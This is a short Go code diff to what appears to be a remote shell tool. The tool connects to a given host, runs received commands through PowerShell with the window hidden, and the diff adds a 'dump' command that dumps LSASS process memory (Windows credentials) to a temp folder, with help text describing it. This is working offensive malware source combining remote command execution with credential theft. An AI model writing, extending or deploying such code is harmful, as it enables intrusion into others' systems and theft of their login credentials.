@@ -3,6 +3,7 @@ package shell
 import (
 	"bufio"
 	"fmt"
+	d "github/Gofrette/dump"
 	"net"
 	"os"
 	"os/exec"
@@ -57,6 +58,10 @@ func Shell(host string) {
 			//Exit terminal
 			c.Close();
 			os.Exit(0)
+		case "dump":
+			d.Dump("C:\\temp\\",c)
+		case "help":
+			c.Write([]byte("exit : exit terminal\ndump : dump lsass in /tmp\n"))
 		default:
 			cmd := exec.Command("powershell", "/C", cmd)
 			//Hide windows
